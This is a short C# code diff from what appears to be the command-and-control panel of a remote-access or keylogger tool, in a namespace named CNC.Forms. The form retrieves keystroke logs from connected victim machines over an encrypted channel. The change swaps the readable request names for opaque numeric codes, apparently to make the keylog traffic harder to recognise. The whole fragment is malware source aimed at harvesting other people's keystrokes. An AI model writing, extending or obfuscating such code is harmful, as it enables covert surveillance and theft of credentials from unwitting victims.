@@ -24,7 +24,7 @@ namespace CNC.Forms
             currentClient = client;
             InitializeComponent();
 
-            string length = Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("GetKeylogDumpLengthReq", "GetKeylogDumpLengthRep", 10000,
+            string length = Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("0x20", "1x20", 10000,
               Cryptography.Encrypt(Guid.NewGuid().ToString())));
             CachedKeylog = new string[Convert.ToInt32(length)];
             scrollBar.Maximum = CachedKeylog.Length;
@@ -39,7 +39,7 @@ namespace CNC.Forms
         {
             if (!HaveAll(offset, length))
             {
-                string message = currentClient.Connection.SendReceiveObject<string, string>("GetKeylogChunkReq", "GetKeylogChunkRep", 25000,
+                string message = currentClient.Connection.SendReceiveObject<string, string>("0x19", "1x19", 25000,
                     Cryptography.Encrypt(JsonConvert.SerializeObject(new int[] { offset, length })));
                 string[] rows = JsonConvert.DeserializeObject<string[]>(Cryptography.Decrypt(message));
 
